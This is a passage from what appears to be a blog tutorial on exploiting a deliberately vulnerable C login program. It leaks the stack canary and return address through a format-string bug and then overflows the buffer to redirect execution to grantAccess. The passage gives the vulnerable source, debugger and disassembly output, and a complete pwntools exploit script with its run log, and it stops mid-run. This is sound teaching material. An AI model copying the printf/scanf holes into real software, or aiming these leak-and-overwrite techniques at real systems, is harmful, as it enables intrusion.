</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received so far:
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Enter password for: &#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Attempting to read leaked pointer
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Raw leak bytes: b<span style=color:#e6db74>&#39;0x55bbc51d72cb&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Leaked <span style=color:#66d9ef>return</span> address: 0x55bbc51d72cb
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Calculating grantAccess
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> grantAccess <span style=color:#f92672>=</span> 0x55bbc51d71a9
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Building payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Payload length: <span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Payload bytes: b<span style=color:#e6db74>&#39;AAAAAAAABBBBBBBB\xa9q\x1d\xc5\xbbU\x00\x00&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending password payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Sent 0x19 bytes:
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000000</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span>  <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span>  │AAAA│AAAA│BBBB│BBBB│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000010</span>  a9 <span style=color:#ae81ff>71</span> 1d c5  bb <span style=color:#ae81ff>55</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  0a                        │·q··│·U··│·│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000019</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Reading remaining output
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>37B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x25 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Authentication Failed\n&#39;</span>
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Access Granted\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopped process <span style=color:#e6db74>&#39;./vuln&#39;</span> <span style=color:#f92672>(</span>pid 3536<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Authentication Failed
</span></span><span style=display:flex><span>Access Granted
</span></span></code></pre></div><p>This shows that the exploit worked!</p><h3 id=exploit-2-buffer-overflow-with-stack-canary-enabled>Exploit 2: Buffer Overflow with Stack Canary Enabled<a hidden class=anchor aria-hidden=true href=#exploit-2-buffer-overflow-with-stack-canary-enabled>#</a></h3><p>In our previous exploit we disabled stack canary because the buffer overflow will overwrite canary and the program will crash before we execute the code for <code>grantAccess</code>.</p><p>Now we will keep the stack canary enabled and achieve the same result. The key to this attack is we can leak the stack canary in the same way we leaked the return address. Then while building the payload, we will make sure that the value of canary gets overwritten with same value, so the canary check won&rsquo;t fail.</p><p>For this example, i will change the length of username to 12 bytes, because we need to pass more than 8 bytes of input without overwriting canary. Even though we&rsquo;ve defined <code>username</code> after <code>password</code>, <code>username</code> appears on stack first, meaning closer to canary. Compiler is free to reorder local variables on stack, so we can&rsquo;t rely on it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkPassword</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> password, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(password, <span style=color:#e6db74>&#34;admin123&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> username[<span style=color:#ae81ff>12</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter Username: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter password for: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(username);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkPassword</span>(password, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc  -O0 -o vuln_canary  main.c
</span></span><span style=display:flex><span>main.c: In <span style=color:#66d9ef>function</span> ‘AuthenticateUser’:
</span></span><span style=display:flex><span>main.c:26:17: warning: format not a string literal and no format arguments <span style=color:#f92672>[</span>-Wformat-security<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>26</span> |          printf<span style=color:#f92672>(</span>username<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>      |                 ^~~~~~~~
</span></span></code></pre></div><p>With <code>-fstack-protector</code> (or default GCC settings), the stack frame becomes:</p><pre tabindex=0><code>Higher addresses
┌──────────────────────────┐
│ Saved RBP                │ ← rbp
├──────────────────────────┤
│ Return Address           │ ← rbp+8
├──────────────────────────┤
│ Stack Canary (8 bytes)   │ ← rbp-0x8
├──────────────────────────┤
│ username[12]             │ ← rbp-0x14
├──────────────────────────┤
│ password[8]              │ ← rbp-0x1c
├──────────────────────────┤
│ isAuthenticated (4)      │ ← rbp-0x20
├──────────────────────────┤
│ padding (4 bytes)        │ ← rbp-0x24 (implicit)
└──────────────────────────┘
Lower addresses
</code></pre><p>Since the return address was at <code>[rsp+40]</code> earlier, with this intuition it seems like it should be present at <code>[rsp+48]</code> because of 8 byte stack canary added in between. But actually, it will still be at <code>[rsp+40]</code> because the space used for padding will be compensated.</p><p>We can verify it from GDB</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>Breakpoint 1, 0x0000555555555226 in AuthenticateUser <span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> AuthenticateUser:
</span></span><span style=display:flex><span>   0x000055555555521e &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x0000555555555222 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x0000555555555223 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x0000555555555226 &lt;+8&gt;:	sub    rsp,0x20
</span></span><span style=display:flex><span>   0x000055555555522a &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28
</span></span><span style=display:flex><span>   0x0000555555555233 &lt;+21&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rax
</span></span><span style=display:flex><span>   0x0000555555555237 &lt;+25&gt;:	xor    eax,eax
</span></span><span style=display:flex><span>   0x0000555555555239 &lt;+27&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>   0x0000555555555240 &lt;+34&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdd5<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x55555555601c</span>
</span></span><span style=display:flex><span>   0x0000555555555247 &lt;+41&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000055555555524a &lt;+44&gt;:	mov    eax,0x0
</span></span></code></pre></div><p>We can see that the stack size is still 32 bytes from <code>sub rsp,0x20</code> which is sill same as earlier.</p><p>But one additional change now is that some lines of code will be added for stack canary as well. So we need to recalculate the offset of <code>grantAccess</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ objdump -d -M intel,mnemonic,no-att -j .text vuln_canary
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000012fc &lt;main&gt;:
</span></span><span style=display:flex><span>    12fc:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    1300:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    1301:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    1304:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1309:	e8 <span style=color:#ae81ff>10</span> ff ff ff       	call   121e &lt;AuthenticateUser&gt;
</span></span><span style=display:flex><span>    130e:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0.  &lt;- <span style=color:#66d9ef>return</span> address to main
</span></span><span style=display:flex><span>    1313:	5d                   	pop    rbp
</span></span><span style=display:flex><span>    1314:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000011c9 &lt;grantAccess&gt;:
</span></span><span style=display:flex><span>    11c9:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    11cd:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    11ce:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    11d1:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> 2c 0e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xe2c<span style=color:#f92672>]</span>        <span style=color:#75715e># 2004 &lt;_IO_stdin_used+0x4&gt;</span>
</span></span><span style=display:flex><span>    11d8:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    11db:	e8 b0 fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>    11e0:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>    11e1:	5d                   	pop    rbp
</span></span><span style=display:flex><span>    11e2:	c3                   	ret
</span></span></code></pre></div><p>The return address to main is now <code>0x130e</code> and <code>grantAccess</code> is at <code>0x11c9</code>. So relative offset is <code>0x130e - 0x11c9 = 0x145</code> or 325 bytes.</p><p>With the same idea that last 3 nibbles remain same even with ASLR, we need to look for aress ending with <code>30e</code> while leaking.</p><p>We can see that stack canary is 16 bytes behind the return address, so it must be at <code>[rsp+24]</code>. ANother way to spot stack canary is to look for numbers with last two nibbles as 0&rsquo;s.</p><h4 id=why-stack-canary-has-last-8-bits-set-to-0>Why Stack Canary has Last 8 bits set to 0<a hidden class=anchor aria-hidden=true href=#why-stack-canary-has-last-8-bits-set-to-0>#</a></h4><p>The stack canary intentionally ends with a zero byte (\x00) to break string-based overflows.</p><pre tabindex=0><code>0x77111d362d141300
                ^^
               \x00
</code></pre><p>On x86-64 Linux, the stack canary typically looks like:</p><pre tabindex=0><code>[random 7 bytes][00]
</code></pre><p><strong>Why the last byte is zero (the real reason)?</strong></p><ul><li>To stop <code>strcpy</code>, <code>scanf("%s")</code>, <code>gets</code>, etc.</li><li>Cannot copy a zero byte unless explicitly told to.</li></ul><p>So if the canary ends with <code>\x00</code>:
• Any string overflow will stop before overwriting the canary
• Or it will overwrite only the first few bytes, not the full value
• Result: canary mismatch → __stack_chk_fail</p><p>This defeats accidental and naive overwrites.</p><h4 id=leaking-the-address>Leaking the Address<a hidden class=anchor aria-hidden=true href=#leaking-the-address>#</a></h4><p>Now can leak 9th and 11th argument for canary and return address respectively</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./vuln_canary
</span></span><span style=display:flex><span>Enter Username: %11$p-%9$p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x604f9f2ce30e-0x7fb896f70c86ed00
</span></span></code></pre></div><h4 id=overflowing-the-buffer>Overflowing the Buffer<a hidden class=anchor aria-hidden=true href=#overflowing-the-buffer>#</a></h4><p>Using this information we can build the buffer in this pattern</p><pre tabindex=0><code>[ buffer fill up to canary ]
[ exact 8-byte canary ]
[ fake saved RBP (8 bytes, anything) ]
[ new return address (8 bytes) ]
</code></pre><p>Now we can write a python script using pwntools to exploit this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./vuln_canary&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Launching process&#34;</span>)
</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;./vuln_canary&#34;</span>, stdin<span style=color:#f92672>=</span>PTY, stdout<span style=color:#f92672>=</span>PTY)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 1: Leak</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Waiting for &#39;Enter Username:&#39;&#34;</span>)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Enter Username: &#34;</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Received so far:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span>data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Sending format string leak&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;%11$p-%9$p&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Reading leak output&#34;</span>)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Enter password for: &#34;</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>+=</span> p<span style=color:#f92672>.</span>recv(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.2</span>)   <span style=color:#75715e># drain remaining output</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Full leak buffer:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span>data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    leaks <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>rb</span><span style=color:#e6db74>&#34;0x[0-9a-fA-F]+&#34;</span>, data)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(leaks) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[!] Failed to extract leaks&#34;</span>)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ret_addr <span style=color:#f92672>=</span> int(leaks[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    canary   <span style=color:#f92672>=</span> int(leaks[<span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] Leaked return address: </span><span style=color:#e6db74>{</span>hex(ret_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] Leaked canary        : </span><span style=color:#e6db74>{</span>hex(canary)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 2: Calculate target</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    OFFSET_RET_TO_GRANT <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x145</span>   <span style=color:#75715e># verified earlier</span>
</span></span><span style=display:flex><span>    grant_access <span style=color:#f92672>=</span> ret_addr <span style=color:#f92672>-</span> OFFSET_RET_TO_GRANT
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] Calculated grantAccess: </span><span style=color:#e6db74>{</span>hex(grant_access)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 3: Build payload</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    payload  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>20</span>          <span style=color:#75715e># padding up to canary</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(canary)        <span style=color:#75715e># correct canary</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;B&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>           <span style=color:#75715e># saved RBP</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(grant_access)  <span style=color:#75715e># new return address</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Payload length: </span><span style=color:#e6db74>{</span>len(payload)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Payload bytes: </span><span style=color:#e6db74>{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 4: Trigger overflow</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Sending password payload&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 5: Read result</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    out <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvall(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Program output:&#34;</span>)
</span></span><span style=display:flex><span>    print(out<span style=color:#f92672>.</span>decode(errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ignore&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Access Granted&#34;</span> <span style=color:#f92672>in</span> out:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[+] SUCCESS: Exploit worked&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[-] FAILURE: Exploit did not work&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 pwn_payload_canary2.py
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln_canary&#39;</span>
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      Full RELRO
</span></span><span style=display:flex><span>    Stack:      Canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        PIE enabled
</span></span><span style=display:flex><span>    SHSTK:      Enabled
</span></span><span style=display:flex><span>    IBT:        Enabled
</span></span><span style=display:flex><span>    Stripped:   No
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Launching process
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./vuln_canary&#39;</span> argv<span style=color:#f92672>=[</span>b<span style=color:#e6db74>&#39;./vuln_canary&#39;</span><span style=color:#f92672>]</span> : pid <span style=color:#ae81ff>3978</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Waiting <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;Enter Username:&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x10 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Enter Username: &#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received so far:
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Enter Username: &#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending format string leak
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Sent 0xb bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;%11$p-%9$p\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Reading leak output
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x35 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Full leak buffer:
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Leaked <span style=color:#66d9ef>return</span> address: 0x60f3fb9c530e
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Leaked canary        : 0xd3be8511a62f4400
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Calculated grantAccess: 0x60f3fb9c51c9
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Payload length: <span style=color:#ae81ff>44</span>
